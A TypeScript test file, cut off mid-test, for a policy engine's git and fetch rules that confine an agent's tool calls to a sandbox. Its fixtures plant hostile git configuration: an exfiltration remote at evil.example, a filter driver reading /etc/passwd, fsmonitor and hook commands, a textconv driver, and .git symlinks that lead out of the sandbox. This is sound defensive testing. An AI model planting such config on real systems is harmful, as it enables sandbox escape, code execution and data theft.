/**
 * Structural policy rules for git and fetch (src/trusted-process/git-structural-rules.ts
 * and the PolicyEngine wiring):
 *
 *  - a git remote argument that names a local repository (`/abs`, `~/x`,
 *    `file://<any host>/<path>`) is evaluated as a filesystem read of that
 *    path: protected sources are denied, sandbox sources are sandbox-resolved,
 *    others go through compiled read-path rules, and the domain gate never
 *    judges the path as a domain -- while a configured remote that merely
 *    looks like a path is still resolved to where it connects, and a
 *    configured remote that resolves to a protected repository is denied;
 *  - a filesystem write or delete with a `.git` path component escalates even
 *    inside the sandbox, reads do not, and a compiled deny still wins;
 *  - a git call on a repository whose `.git` redirects outside the sandbox, or
 *    whose config sets core.worktree outside it, includes another file or
 *    defines a driver, escalates with a fixed-vocabulary reason;
 *  - fetches of local or cloud-metadata hosts are denied whatever the compiled
 *    rules say, and a server without an allowlist gets the default `['*']`
 *    gate, so IP literals escalate;
 *  - without a sandbox directory no git runs in an agent-named repository;
 *  - the acceptance cases hold with the shipped policy and allowlists;
 *  - the pipeline never whitelists the structural git escalations.
 */

import { execFileSync, spawnSync } from 'node:child_process';
import {
  appendFileSync,
  existsSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  realpathSync,
  renameSync,
  rmSync,
  symlinkSync,
  writeFileSync,
} from 'node:fs';
import { homedir, tmpdir } from 'node:os';
import { delimiter, dirname, join, resolve } from 'node:path';
import { fileURLToPath } from 'node:url';
import type { LanguageModelV3 } from '@ai-sdk/provider';
import { MockLanguageModelV3 } from 'ai/test';
import { afterAll, beforeAll, describe, expect, it, vi, type Mock } from 'vitest';

import { extractServerDomainAllowlists } from '../src/config/index.js';
import type { MCPServerConfig } from '../src/config/types.js';
import type {
  CompiledPolicyFile,
  CompiledRule,
  DynamicListsFile,
  StoredToolAnnotationsFile,
} from '../src/pipeline/types.js';
import type { ToolCallRequest } from '../src/types/mcp.js';
import { resolveStoredAnnotation } from '../src/types/argument-roles.js';
import { createApprovalWhitelist } from '../src/trusted-process/approval-whitelist.js';
import { isLocalOrMetadataHost, resolveUrlForDomainCheck } from '../src/trusted-process/domain-utils.js';
import { parseLocalGitSource, resolveGitRemoteUrls } from '../src/trusted-process/git-remote-resolution.js';
import {
  LOCAL_GIT_SOURCE_ARG_SUFFIX,
  STRUCTURAL_GIT_INTERNALS_ESCALATE,
  STRUCTURAL_GIT_REPOSITORY_ESCALATE,
  hasGitInternalsSegment,
  inspectRepositoryForPolicy,
  requiresPerCallApproval,
  withLocalGitSourceReads,
  type RepositoryInspections,
} from '../src/trusted-process/git-structural-rules.js';
import { LOCAL_DESTINATION_DENY_RESULT, PolicyEngine } from '../src/trusted-process/policy-engine.js';
import type { ResolvedSandboxConfig } from '../src/trusted-process/sandbox-integration.js';
import {
  handleCallTool,
  type CallToolDeps,
  type ClientState,
  type InProcessEscalationFn,
  type ProxiedTool,
} from '../src/trusted-process/tool-call-pipeline.js';
import { withInputSchemas } from './fixtures/test-policy.js';

const posix = process.platform !== 'win32';
const gitAvailable = spawnSync('git', ['--version'], { stdio: 'ignore' }).status === 0;

const GIT_ENV = {
  ...process.env,
  GIT_AUTHOR_NAME: 'Test',
  GIT_AUTHOR_EMAIL: 'test@test.local',
  GIT_COMMITTER_NAME: 'Test',
  GIT_COMMITTER_EMAIL: 'test@test.local',
  GIT_CONFIG_NOSYSTEM: '1',
};

function git(cwd: string, ...args: string[]): string {
  return execFileSync('git', args, {
    cwd,
    encoding: 'utf-8',
    stdio: ['ignore', 'pipe', 'pipe'],
    timeout: 10_000,
    env: GIT_ENV,
  });
}

/** A repository with one commit, so worktrees and redirects have something to point at. Idempotent. */
function initRepo(dir: string): string {
  if (existsSync(join(dir, '.git'))) return dir;
  mkdirSync(dir, { recursive: true });
  git(dir, 'init', '-q', '-b', 'main');
  writeFileSync(join(dir, 'README'), 'hello\n');
  git(dir, 'add', 'README');
  git(dir, 'commit', '-q', '-m', 'init');
  return dir;
}

// ---------------------------------------------------------------------------
// Layout: a protected IronCurtain home holding the sandbox, and an outside
// tree with a readable directory (allowed by a compiled rule) and a secret one.
// ---------------------------------------------------------------------------

let root: string;
let icHome: string;
let sandbox: string;
let outside: string;
let readable: string;
let secretRepo: string;

beforeAll(() => {
  root = realpathSync(mkdtempSync(join(tmpdir(), 'ic-git-structural-')));
  icHome = join(root, 'ironcurtain-home');
  sandbox = join(icHome, 'sessions', 's1', 'sandbox');
  outside = join(root, 'outside');
  readable = join(outside, 'readable');
  secretRepo = join(outside, 'secret-repo');
  for (const dir of [sandbox, readable, secretRepo, join(sandbox, 'repo'), join(sandbox, 'dest')]) {
    mkdirSync(dir, { recursive: true });
  }
});

afterAll(() => {
  rmSync(root, { recursive: true, force: true });
});

const annotations = withInputSchemas({
  generatedAt: 'test',
  servers: {
    git: {
      inputHash: 'test',
      tools: [
        {
          toolName: 'git_clone',
          serverName: 'git',
          comment: 'Clone a repository from a URL or a local path',
          args: { url: ['git-remote-url'], path: ['write-path'], depth: ['none'] },
        },
        {
          toolName: 'git_status',
          serverName: 'git',
          comment: 'Show the working tree status',
          args: { path: ['read-path'] },
        },
        {
          toolName: 'git_fetch',
          serverName: 'git',
          comment: 'Fetch from a remote',
          args: { path: ['read-path'], remote: ['git-remote-url'] },
        },
      ],
    },
    filesystem: {
      inputHash: 'test',
      tools: [
        {
          toolName: 'read_file',
          serverName: 'filesystem',
          comment: 'Read a file',
          args: { path: ['read-path'] },
        },
        {
          toolName: 'write_file',
          serverName: 'filesystem',
          comment: 'Write a file',
          args: { path: ['write-path'], content: ['none'] },
        },
        {
          toolName: 'create_directory',
          serverName: 'filesystem',
          comment: 'Create a directory',
          args: { path: ['write-path'] },
        },
        {
          toolName: 'move_file',
          serverName: 'filesystem',
          comment: 'Move or rename',
          args: { source: ['read-path', 'delete-path'], destination: ['write-path'] },
        },
      ],
    },
    fetch: {
      inputHash: 'test',
      tools: [
        {
          toolName: 'http_fetch',
          serverName: 'fetch',
          comment: 'Fetch a URL',
          args: { url: ['fetch-url'], headers: ['none'] },
        },
      ],
    },
  },
});

function rule(name: string, condition: CompiledRule['if'], then: CompiledRule['then'], reason: string): CompiledRule {
  return { name, description: name, principle: 'test', if: condition, then, reason };
}

/** Permissive where it matters: the URL role of a clone is always allowed, so the read evaluation decides. */
function policy(): CompiledPolicyFile {
  return {
    generatedAt: 'test',
    constitutionHash: 'test',
    inputHash: 'test',
    rules: [
      rule(
        'allow-git-reads-in-readable',
        { server: ['git'], paths: { roles: ['read-path'], within: readable } },
        'allow',
        'ok',
      ),
      rule(
        'escalate-git-reads',
        { server: ['git'], roles: ['read-path'] },
        'escalate',
        'Reads outside the sandbox need approval',
      ),
      rule(
        'allow-git-clone-source',
        { server: ['git'], tool: ['git_clone'], roles: ['git-remote-url'] },
        'allow',
        'ok',
      ),
      rule('escalate-git-fetch', { server: ['git'], tool: ['git_fetch'] }, 'escalate', 'Fetch needs approval'),
      rule('allow-fs-reads', { server: ['filesystem'], roles: ['read-path'] }, 'allow', 'ok'),
      rule(
        'escalate-fs-writes',
        { server: ['filesystem'], roles: ['write-path'] },
        'escalate',
        'Writes outside need approval',
      ),
      rule(
        'deny-fs-deletes',
        { server: ['filesystem'], roles: ['delete-path'] },
        'deny',
        'Deletes outside are forbidden',
      ),
      rule('allow-fetch-any', { server: ['fetch'], tool: ['http_fetch'] }, 'allow', 'ok'),
    ],
  };
}

function request(serverName: string, toolName: string, args: Record<string, unknown>): ToolCallRequest {
  return { requestId: 't', serverName, toolName, arguments: args, timestamp: '' };
}

function makeEngine(options: { allowlists?: Map<string, string[]>; sandbox?: string | undefined } = {}): PolicyEngine {
  const sandboxDir = 'sandbox' in options ? options.sandbox : sandbox;
  return new PolicyEngine(
    policy(),
    annotations,
    [icHome, join(homedir(), '.ironcurtain')],
    sandboxDir,
    options.allowlists,
  );
}

const GIT_ALLOWLIST = new Map([['git', ['github.com', '*.github.com']]]);

// ---------------------------------------------------------------------------
// parseLocalGitSource / withLocalGitSourceReads
// ---------------------------------------------------------------------------

describe('parseLocalGitSource', () => {
  it('recognizes absolute and ~ paths as the path git opens', () => {
    expect(parseLocalGitSource('/srv/repo.git')).toEqual({ kind: 'path', path: '/srv/repo.git' });
    expect(parseLocalGitSource('/home/u/a:b')).toEqual({ kind: 'path', path: '/home/u/a:b' });
    expect(parseLocalGitSource('~')).toEqual({ kind: 'path', path: '~' });
    expect(parseLocalGitSource('~/repo')).toEqual({ kind: 'path', path: '~/repo' });
  });

  it('drops the host of a file:// URL and percent-decodes the path like git', () => {
    expect(parseLocalGitSource('file:///srv/repo.git')).toEqual({ kind: 'path', path: '/srv/repo.git' });
    expect(parseLocalGitSource('file://github.com/srv/repo.git')).toEqual({ kind: 'path', path: '/srv/repo.git' });
    expect(parseLocalGitSource('file://localhost/srv/re%20po')).toEqual({ kind: 'path', path: '/srv/re po' });
    expect(parseLocalGitSource('file://github.com%2Fsrv/repo')).toEqual({ kind: 'path', path: '/srv/repo' });
    expect(parseLocalGitSource('file:///srv/%2e%2e/etc')).toEqual({ kind: 'path', path: '/srv/../etc' });
  });

  it('refuses file URLs whose path cannot be established safely', () => {
    expect(parseLocalGitSource('file://github.com')).toMatchObject({ kind: 'unresolvable' });
    expect(parseLocalGitSource('file:///srv/repo%00/x')).toMatchObject({ kind: 'unresolvable' });
    expect(parseLocalGitSource('file:///srv/re%0apo')).toMatchObject({ kind: 'unresolvable' });
  });

  it('leaves network URLs, remote names, relative paths and remote helpers alone', () => {
    for (const value of [
      'https://github.com/o/r.git',
      'git@github.com:o/r.git',
      'ssh://git@github.com/o/r',
      'origin',
      'upstream',
      './relative',
      '../sibling',
      'repo',
      '~user/repo',
      'FILE:///srv/repo', // git hands a non-lowercase scheme to git-remote-FILE
      'file:/srv/repo', // not a URL to git: ssh to host "file"
      'ext::sh -c id',
    ]) {
      expect(parseLocalGitSource(value), value).toBeUndefined();
    }
  });
});

describe('withLocalGitSourceReads', () => {
  // The engine hands the annotation resolved for the call, not the stored one.
  const clone = resolveStoredAnnotation(annotations.servers.git.tools[0], {});

  it('adds a synthetic read-path argument holding the path and keeps the URL argument as given', () => {
    const view = withLocalGitSourceReads({ url: 'file://github.com/srv/repo', path: '/sbx/dest' }, clone);
    const synthetic = `url${LOCAL_GIT_SOURCE_ARG_SUFFIX}`;
    expect(view.args).toEqual({ url: 'file://github.com/srv/repo', path: '/sbx/dest', [synthetic]: '/srv/repo' });
    expect(view.annotation.args).toEqual({ ...clone.args, [synthetic]: ['read-path'] });
  });

  it('returns the inputs themselves for a network URL', () => {
    const args = { url: 'https://github.com/o/r.git', path: '/sbx/dest' };
    const view = withLocalGitSourceReads(args, clone);
    expect(view.args).toBe(args);
    expect(view.annotation).toBe(clone);
  });

  it('throws a PathResolutionError for a local source without a safe path', () => {
    expect(() => withLocalGitSourceReads({ url: 'file://github.com', path: '/sbx/dest' }, clone)).toThrow(
      expect.objectContaining({ code: 'PATH_UNRESOLVABLE' }),
    );
  });

  it('recognizes a source in the spelling git receives, and every local element of an array', () => {
    const synthetic = `url${LOCAL_GIT_SOURCE_ARG_SUFFIX}`;
    // prepareToolArgs canonicalizes `FILE://` to `file://` before git sees it.
    expect(withLocalGitSourceReads({ url: 'FILE:///srv/repo', path: '/sbx/dest' }, clone).args[synthetic]).toBe(
      '/srv/repo',
    );
    const view = withLocalGitSourceReads(
      { url: ['https://github.com/o/r.git', 'file://host/srv/a', '/srv/b'], path: '/sbx/dest' },
      clone,
    );
    expect(view.args[synthetic]).toEqual(['/srv/a', '/srv/b']);
  });
});

// ---------------------------------------------------------------------------
// Local git sources through the engine
// ---------------------------------------------------------------------------

describe.skipIf(!gitAvailable || !posix)('local git clone sources are evaluated as reads', () => {
  it('denies a protected source given as a bare path, before any escalation', () => {
    const result = makeEngine({ allowlists: GIT_ALLOWLIST }).evaluate(
      request('git', 'git_clone', {
        url: join(icHome, 'sessions', 'other', 'sandbox', 'repo'),
        path: join(sandbox, 'dest'),
      }),
    );
    expect(result).toMatchObject({ decision: 'deny', rule: 'structural-protected-path' });
  });

  it('denies a protected source given as file://github.com/<path> (git ignores the host)', () => {
    const result = makeEngine({ allowlists: GIT_ALLOWLIST }).evaluate(
      request('git', 'git_clone', {
        url: `file://github.com${join(icHome, 'generated')}`,
        path: join(sandbox, 'dest'),
      }),
    );
    expect(result).toMatchObject({ decision: 'deny', rule: 'structural-protected-path' });
  });

  it('denies a protected ~ source', () => {
    const result = makeEngine().evaluate(
      request('git', 'git_clone', { url: '~/.ironcurtain/sessions/x/sandbox', path: join(sandbox, 'dest') }),
    );
    expect(result).toMatchObject({ decision: 'deny', rule: 'structural-protected-path' });
  });

  it('denies a protected source in an upper-case FILE:// spelling or inside an array', () => {
    // The domain gate canonicalizes FILE:// to file:// (as the transport
    // does); the read-path view must see the same local source, or the gate
    // would wave it through as a local read nobody evaluated.
    for (const url of [`FILE://${join(icHome, 'generated')}`, [`file://github.com${join(icHome, 'generated')}`]]) {
      const result = makeEngine({ allowlists: GIT_ALLOWLIST }).evaluate(
        request('git', 'git_clone', { url, path: join(sandbox, 'dest') }),
      );
      expect(result, JSON.stringify(url)).toMatchObject({ decision: 'deny', rule: 'structural-protected-path' });
    }
  });

  it('denies a configured remote that resolves to a protected repository and escalates other local remotes', () => {
    // Planted directly in the config (Docker Agent Mode writes .git/config
    // through the bind mount without any tool call).
    const repo = initRepo(join(sandbox, 'local-remotes'));
    appendFileSync(
      join(repo, '.git', 'config'),
      `[remote "origin"]\n\turl = ${join(icHome, 'sessions', 'other', 'sandbox', 'repo')}\n` +
        `[remote "mirror"]\n\turl = file://github.com${secretRepo}\n`,
    );
    const engine = makeEngine({ allowlists: GIT_ALLOWLIST });
    expect(engine.evaluate(request('git', 'git_fetch', { path: repo, remote: 'origin' }))).toMatchObject({
      decision: 'deny',
      rule: 'structural-protected-path',
    });
    const mirror = engine.evaluate(request('git', 'git_fetch', { path: repo, remote: 'mirror' }));
    expect(mirror).toMatchObject({ decision: 'escalate', rule: 'structural-domain-escalate' });
    expect(mirror.reason).toContain('it resolves to a local repository path');
    expect(mirror.reason).not.toContain(secretRepo);

    // Still denied when other repository config also makes the remote
    // unverifiable (a proxy override), and through a trusted URL rewrite.
    const proxied = initRepo(join(sandbox, 'local-remote-proxied'));
    appendFileSync(
      join(proxied, '.git', 'config'),
      `[remote "origin"]\n\turl = ${join(icHome, 'generated')}\n[http]\n\tproxy = http://proxy.example:3128\n`,
    );
    expect(engine.evaluate(request('git', 'git_fetch', { path: proxied, remote: 'origin' }))).toMatchObject({
      decision: 'deny',
      rule: 'structural-protected-path',
    });
    const rewritten = resolveUrlForDomainCheck(
      'https://github.com/acme/project.git',
      'git-remote-url',
      { path: join(sandbox, 'dest') },
      {
        allowedDirectory: sandbox,
        loadTrustedGitConfig: () => ({
          entries: [
            {
              section: 'url',
              subsection: `${icHome}/`,
              name: 'insteadof',
              key: `url.${icHome}/.insteadof`,
              value: 'https://github.com/',
              line: 0,
            },
          ],
        }),
      },
    );
    expect(rewritten).toMatchObject({ status: 'unverifiable', localPaths: [join(icHome, 'acme/project.git')] });
  });

  it('escalates on the read of a source outside every permitted directory, not on a domain', () => {
    const result = makeEngine({ allowlists: GIT_ALLOWLIST }).evaluate(
      request('git', 'git_clone', { url: secretRepo, path: join(sandbox, 'dest') }),
    );
    expect(result).toMatchObject({ decision: 'escalate', rule: 'escalate-git-reads', escalatedRoles: ['read-path'] });
  });

  it('treats file://<host>/<path> the same as the bare path, whatever the host', () => {
    for (const url of [`file://${secretRepo}`, `file://github.com${secretRepo}`, `file://localhost${secretRepo}`]) {
      const result = makeEngine({ allowlists: GIT_ALLOWLIST }).evaluate(
        request('git', 'git_clone', { url, path: join(sandbox, 'dest') }),
      );
      expect(result, url).toMatchObject({ decision: 'escalate', rule: 'escalate-git-reads' });
    }
  });

  it('allows a source in a directory the compiled rules allow reading', () => {
    const result = makeEngine({ allowlists: GIT_ALLOWLIST }).evaluate(
      request('git', 'git_clone', { url: join(readable, 'repo'), path: join(sandbox, 'dest') }),
    );
    expect(result.decision).toBe('allow');
  });

  it('percent-decodes the file URL path before evaluating it', () => {
    const result = makeEngine().evaluate(
      request('git', 'git_clone', { url: `file://${readable}/re%20po`, path: join(sandbox, 'dest') }),
    );
    expect(result.decision).toBe('allow');
  });

  it('sandbox-resolves a source inside the sandbox', () => {
    const result = makeEngine({ allowlists: GIT_ALLOWLIST }).evaluate(
      request('git', 'git_clone', { url: join(sandbox, 'repo'), path: join(sandbox, 'dest') }),
    );
    expect(result).toMatchObject({ decision: 'allow', rule: 'allow-git-clone-source' });
  });

  it('denies a file URL whose path cannot be established', () => {
    for (const url of ['file://github.com', `file://${secretRepo}%00/x`]) {
      const result = makeEngine().evaluate(request('git', 'git_clone', { url, path: join(sandbox, 'dest') }));
      expect(result, url).toMatchObject({ decision: 'deny', rule: 'structural-unresolvable-path' });
    }
  });

  it('still escalates on the gate when a configured remote merely looks like a local path', () => {
    // Git looks the argument up among the configured remotes first, by its
    // exact spelling: a planted `[remote "/outside/secret-repo"]` makes
    // `git fetch /outside/secret-repo` contact its URL, not the path.
    const repo = initRepo(join(sandbox, 'path-named-remote'));
    // `git remote add` refuses such a name, but the config file takes it.
    appendFileSync(join(repo, '.git', 'config'), `[remote "${secretRepo}"]\n\turl = https://evil.example/exfil.git\n`);
    const result = makeEngine({ allowlists: GIT_ALLOWLIST }).evaluate(
      request('git', 'git_fetch', { path: repo, remote: secretRepo }),
    );
    expect(result).toMatchObject({ decision: 'escalate', rule: 'structural-domain-escalate' });
    expect(result.reason).toContain('"evil.example/exfil"');
  });

  it('reports the local source to the approver as a filesystem read, never as a domain', () => {
    const target = resolveUrlForDomainCheck(`file://github.com${secretRepo}`, 'git-remote-url', {
      path: join(sandbox, 'dest'),
    });
    expect(target).toMatchObject({ status: 'unverifiable', localSource: true, domains: [] });
    expect(resolveGitRemoteUrls(secretRepo, { path: join(sandbox, 'dest') })).toMatchObject({
      ok: true,
      urls: [secretRepo],
    });
  });
});

// ---------------------------------------------------------------------------
// .git internals
// ---------------------------------------------------------------------------

describe('hasGitInternalsSegment', () => {
  it('matches a .git component at any depth, folded', () => {
    for (const path of ['/s/repo/.git', '/s/repo/.git/config', '/s/a/b/.git/hooks/pre-commit', '/s/x/.GIT/config']) {
      expect(hasGitInternalsSegment(path), path).toBe(true);
    }
  });

  it('does not match other dot-git names', () => {
    for (const path of [
      '/s/repo/.gitignore',
      '/s/repo/.gitattributes',
      '/s/.github/workflows/ci.yml',
      '/s/repo/src/git.ts',
    ]) {
      expect(hasGitInternalsSegment(path), path).toBe(false);
    }
  });
});

describe('writes and deletes inside .git escalate', () => {
  it('escalates write_file to <sandbox>/repo/.git/config instead of sandbox-allowing it', () => {
    const result = makeEngine().evaluate(
      request('filesystem', 'write_file', { path: join(sandbox, 'repo', '.git', 'config'), content: '[core]\n' }),
    );
    expect(result).toMatchObject({
      decision: 'escalate',
      rule: STRUCTURAL_GIT_INTERNALS_ESCALATE,
      escalatedRoles: ['write-path'],
    });
    expect(requiresPerCallApproval(result)).toBe(true);
  });

  it('escalates hooks, info, a gitfile, nested repositories and a case variant', () => {
    for (const path of [
      join(sandbox, 'repo', '.git', 'hooks', 'pre-commit'),
      join(sandbox, 'repo', '.git', 'info', 'exclude'),
      join(sandbox, 'repo', '.git', 'commondir'),
      join(sandbox, 'evil', '.git'),
      join(sandbox, 'a', 'b', '.git', 'config'),
      join(sandbox, 'repo', '.GIT', 'config'),
    ]) {
      const result = makeEngine().evaluate(request('filesystem', 'write_file', { path, content: 'x' }));
      expect(result, path).toMatchObject({ decision: 'escalate', rule: STRUCTURAL_GIT_INTERNALS_ESCALATE });
    }
    const directory = makeEngine().evaluate(
      request('filesystem', 'create_directory', { path: join(sandbox, 'repo', '.git', 'hooks') }),
    );
    expect(directory).toMatchObject({ decision: 'escalate', rule: STRUCTURAL_GIT_INTERNALS_ESCALATE });
  });

  it('escalates a delete of .git (move_file source) on the delete role', () => {
    const result = makeEngine().evaluate(
      request('filesystem', 'move_file', {
        source: join(sandbox, 'repo', '.git'),
        destination: join(sandbox, 'elsewhere'),
      }),
    );
    expect(result).toMatchObject({ decision: 'escalate', rule: STRUCTURAL_GIT_INTERNALS_ESCALATE });
    expect([...(result.escalatedRoles ?? [])].sort()).toEqual(['delete-path']);
  });

  it('leaves reads of .git contents and writes next to .git alone', () => {
    expect(
      makeEngine().evaluate(request('filesystem', 'read_file', { path: join(sandbox, 'repo', '.git', 'config') })),
    ).toMatchObject({ decision: 'allow', rule: 'structural-sandbox-allow' });
    for (const name of ['.gitignore', '.gitattributes', 'git.txt']) {
      expect(
        makeEngine().evaluate(request('filesystem', 'write_file', { path: join(sandbox, 'repo', name), content: 'x' })),
        name,
      ).toMatchObject({ decision: 'allow', rule: 'structural-sandbox-allow' });
    }
  });

  it('is named ahead of a compiled escalation outside the sandbox, and a compiled deny still wins', () => {
    const escalated = makeEngine().evaluate(
      request('filesystem', 'write_file', { path: join(outside, 'repo', '.git', 'config'), content: 'x' }),
    );
    expect(escalated).toMatchObject({
      decision: 'escalate',
      rule: STRUCTURAL_GIT_INTERNALS_ESCALATE,
      escalatedRoles: ['write-path'],
    });
    const denied = makeEngine().evaluate(
      request('filesystem', 'move_file', { source: join(outside, 'repo', '.git'), destination: join(sandbox, 'x') }),
    );
    expect(denied).toMatchObject({ decision: 'deny', rule: 'deny-fs-deletes' });
  });

  it('applies to the git server too: a clone destination inside .git escalates', () => {
    const result = makeEngine().evaluate(
      request('git', 'git_clone', { url: 'https://github.com/o/r.git', path: join(sandbox, 'repo', '.git', 'x') }),
    );
    expect(result).toMatchObject({ decision: 'escalate', rule: STRUCTURAL_GIT_INTERNALS_ESCALATE });
  });
});

// ---------------------------------------------------------------------------
// Repository inspection
// ---------------------------------------------------------------------------

describe.skipIf(!gitAvailable || !posix)('git calls on untrusted repositories escalate', () => {
  it('allows git_status on an ordinary sandbox repository', () => {
    const repo = initRepo(join(sandbox, 'plain'));
    expect(makeEngine().evaluate(request('git', 'git_status', { path: repo }))).toMatchObject({
      decision: 'allow',
      rule: 'structural-sandbox-allow',
    });
  });

  it('escalates when .git is a gitfile pointing outside the sandbox', () => {
    initRepo(secretRepo);
    const redirected = join(sandbox, 'redirected');
    mkdirSync(redirected, { recursive: true });
    writeFileSync(join(redirected, '.git'), `gitdir: ${join(secretRepo, '.git')}\n`);
    const result = makeEngine().evaluate(request('git', 'git_status', { path: redirected }));
    expect(result).toMatchObject({
      decision: 'escalate',
      rule: STRUCTURAL_GIT_REPOSITORY_ESCALATE,
      escalatedRoles: ['read-path'],
    });
    expect(result.reason).toContain('redirects to a git directory outside the sandbox');
    expect(result.reason).not.toContain(secretRepo);
    expect(requiresPerCallApproval(result)).toBe(true);
  });

  it('escalates when .git is a symbolic link to a git directory outside the sandbox', () => {
    initRepo(secretRepo);
    const linked = join(sandbox, 'linked');
    mkdirSync(linked, { recursive: true });
    symlinkSync(join(secretRepo, '.git'), join(linked, '.git'));
    expect(makeEngine().evaluate(request('git', 'git_status', { path: linked }))).toMatchObject({
      decision: 'escalate',
      rule: STRUCTURAL_GIT_REPOSITORY_ESCALATE,
    });
  });

  it('allows a linked worktree whose gitfile and commondir stay inside the sandbox', () => {
    const main = initRepo(join(sandbox, 'main'));
    git(main, 'worktree', 'add', '-q', join(sandbox, 'wt'), '-b', 'wt');
    expect(makeEngine().evaluate(request('git', 'git_status', { path: join(sandbox, 'wt') }))).toMatchObject({
      decision: 'allow',
      rule: 'structural-sandbox-allow',
    });
  });

  it('escalates core.worktree outside the sandbox and allows it inside', () => {
    const repo = initRepo(join(sandbox, 'worktree-cfg'));
    git(repo, 'config', 'core.worktree', outside);
    const result = makeEngine().evaluate(request('git', 'git_status', { path: repo }));
    expect(result).toMatchObject({ decision: 'escalate', rule: STRUCTURAL_GIT_REPOSITORY_ESCALATE });
    expect(result.reason).toContain('core.worktree points outside the sandbox');

    git(repo, 'config', 'core.worktree', join(sandbox, 'worktree-cfg'));
    expect(makeEngine().evaluate(request('git', 'git_status', { path: repo }))).toMatchObject({ decision: 'allow' });
  });

  it('escalates include, includeIf and driver keys with the subsection elided', () => {
    const included = initRepo(join(sandbox, 'included'));
    git(included, 'config', 'include.path', join(outside, 'extra.gitconfig'));
    const includeResult = makeEngine().evaluate(request('git', 'git_status', { path: included }));
    expect(includeResult).toMatchObject({ decision: 'escalate', rule: STRUCTURAL_GIT_REPOSITORY_ESCALATE });
    expect(includeResult.reason).toContain('include or includeIf');

    const driver = initRepo(join(sandbox, 'driver'));
    git(driver, 'config', 'filter.secret-stealer.clean', 'cat /etc/passwd');
    const driverResult = makeEngine().evaluate(request('git', 'git_status', { path: driver }));
    expect(driverResult).toMatchObject({ decision: 'escalate', rule: STRUCTURAL_GIT_REPOSITORY_ESCALATE });
    expect(driverResult.reason).toContain('filter.*.clean');
    expect(driverResult.reason).not.toContain('secret-stealer');
    expect(driverResult.reason).not.toContain('/etc/passwd');
  });

  it('leaves fixed-name command keys and hook scripts to the hardened git environment', () => {
    // core.fsmonitor, core.hooksPath and friends are pinned by GIT_CONFIG_*
    // overrides in the git backend's environment (git-backend-env.ts); this
    // check covers only what no environment override can neutralize.
    const repo = initRepo(join(sandbox, 'fsmonitor'));
    git(repo, 'config', 'core.fsmonitor', 'touch /tmp/pwned; false');
    writeFileSync(join(repo, '.git', 'hooks', 'pre-commit'), '#!/bin/sh\ntouch /tmp/pwned\n', { mode: 0o755 });
    expect(makeEngine().evaluate(request('git', 'git_status', { path: repo }))).toMatchObject({ decision: 'allow' });
  });

  it('escalates a configuration-defined hook, which no fixed-name override pins', () => {
    const repo = initRepo(join(sandbox, 'config-hook'));
    git(repo, 'config', 'hook.audit-trail.command', 'touch /tmp/pwned');
    git(repo, 'config', 'hook.audit-trail.event', 'pre-commit');
    const result = makeEngine().evaluate(request('git', 'git_status', { path: repo }));
    expect(result).toMatchObject({ decision: 'escalate', rule: STRUCTURAL_GIT_REPOSITORY_ESCALATE });
    expect(result.reason).toContain('defines a hook (hook.*)');
    expect(result.reason).not.toContain('audit-trail');
  });

  it('inspects a local clone source inside the sandbox too', () => {
    const source = initRepo(join(sandbox, 'tainted-source'));
    git(source, 'config', 'diff.evil.textconv', 'id');
    const result = makeEngine().evaluate(request('git', 'git_clone', { url: source, path: join(sandbox, 'dest') }));
    expect(result).toMatchObject({ decision: 'escalate', rule: STRUCTURAL_GIT_REPOSITORY_ESCALATE });
    expect(result.reason).toContain('diff.*.textconv');
  });

  it('escalates any redirect in a repository outside the sandbox that compiled rules allow', () => {
    const main = initRepo(join(readable, 'main'));
    expect(makeEngine().evaluate(request('git', 'git_status', { path: main }))).toMatchObject({
      decision: 'allow',
      rule: 'allow-git-reads-in-readable',
    });
    git(main, 'worktree', 'add', '-q', join(readable, 'wt'), '-b', 'wt');
    const result = makeEngine().evaluate(request('git', 'git_status', { path: join(readable, 'wt') }));
    expect(result).toMatchObject({ decision: 'escalate', rule: STRUCTURAL_GIT_REPOSITORY_ESCALATE });
    expect(result.reason).toContain('redirect');
  });

  it('inspects without a sandbox directory and never needs one to fail closed', () => {
    const repo = initRepo(join(readable, 'no-sandbox'));
    git(repo, 'config', 'include.path', '/nonexistent');
    const engine = makeEngine({ sandbox: undefined });
    expect(engine.evaluate(request('git', 'git_status', { path: repo }))).toMatchObject({
      decision: 'escalate',
      rule: STRUCTURAL_GIT_REPOSITORY_ESCALATE,
    });
  });

  it('inspectRepositoryForPolicy reports nothing for a directory with no repository', () => {
    const empty = join(sandbox, 'empty-dir');
    mkdirSync(empty, { recursive: true });
    expect(inspectRepositoryForPolicy(empty, sandbox)).toBeUndefined();
  });

  // Git creates and appends files through symbolic links inside its git
  // directory (a reflog line carries the agent's commit subject), so a link
  // there that leaves the sandbox makes host git write outside it.
  it('escalates when .git/logs or .git/refs/heads is a symbolic link to a directory outside the sandbox', () => {
    const logsRepo = initRepo(join(sandbox, 'internal-logs'));
    const hostLogs = join(outside, 'host-logs');
    renameSync(join(logsRepo, '.git', 'logs'), hostLogs);
    symlinkSync(hostLogs, join(logsRepo, '.git', 'logs'));
    const logsResult = makeEngine().evaluate(request('git', 'git_status', { path: logsRepo }));
    expect(logsResult).toMatchObject({
      decision: 'escalate',
      rule: STRUCTURAL_GIT_REPOSITORY_ESCALATE,
      escalatedRoles: ['read-path'],
    });
    expect(logsResult.reason).toContain('its git directory has a symbolic link that leads outside the sandbox');
    expect(logsResult.reason).not.toContain(hostLogs);
    expect(requiresPerCallApproval(logsResult)).toBe(true);

    const headsRepo = initRepo(join(sandbox, 'internal-heads'));
    const hostHeads = join(outside, 'host-heads');
    renameSync(join(headsRepo, '.git', 'refs', 'heads'), hostHeads);
    symlinkSync(hostHeads, join(headsRepo, '.git', 'refs', 'heads'));
    expect(makeEngine().evaluate(request('git', 'git_status', { path: headsRepo }))).toMatchObject({
      decision: 'escalate',
      rule: STRUCTURAL_GIT_REPOSITORY_ESCALATE,
    });
  });

  it('allows git internals linked inside the sandbox, and still escalates a link inside them that leaves it', () => {
    const repo = initRepo(join(sandbox, 'internal-inside'));
    const sharedLogs = join(sandbox, 'shared-logs');
    renameSync(join(repo, '.git', 'logs'), sharedLogs);
    symlinkSync(sharedLogs, join(repo, '.git', 'logs'));
    expect(makeEngine().evaluate(request('git', 'git_status', { path: repo }))).toMatchObject({
      decision: 'allow',
      rule: 'structural-sandbox-allow',
    });

    // The link is followed: a reflog directory inside its target that links out is found.
    const hostReflogs = join(outside, 'host-reflogs');
    renameSync(join(sharedLogs, 'refs', 'heads'), hostReflogs);
    symlinkSync(hostReflogs, join(sharedLogs, 'refs', 'heads'));
